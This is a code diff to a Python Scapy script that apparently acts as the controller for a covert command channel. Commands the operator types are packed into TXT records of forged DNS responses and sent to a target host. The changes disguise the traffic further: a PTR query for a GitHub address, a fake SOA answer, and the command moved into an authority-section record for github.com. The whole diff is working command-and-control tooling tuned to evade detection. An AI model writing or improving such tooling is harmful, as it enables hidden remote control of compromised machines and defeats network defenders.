@@ -23,13 +23,14 @@ def makeICMPPacket(command):
 def makeDNSPacket(command):
     global target
     query = DNS(
-        rd=1,
         qr=1,
-        # id=RandShort(),
-        qd=DNSQR(qname="google.com", qtype="A"),
+        id=RandShort(),
+        qd=DNSQR(qname="140.82.122.3", qtype="PTR"),
         an=[
-            DNSRR(rrname="google.com", type="A", rdata="8.8.8.8"),
-            DNSRR(rrname="google.com", type="TXT", rdata="command=" + command),
+            DNSRR(rrname="google.com", type="SOA", rdata="8.8.8.8"),
+        ],
+        ns=[
+            DNSRR(rrname="github.com", type="TXT", rdata="command=" + command),
         ],
     )
     toBeSent = IP(dst=target) / UDP(sport=53, dport=54576) / query
@@ -42,7 +43,6 @@ def main() -> None:
 
     global target
     target = argv[1]
-    print(get_if_list())
     while 1:
         command_input = str(input("Command input >> "))
         makeDNSPacket(command_input)
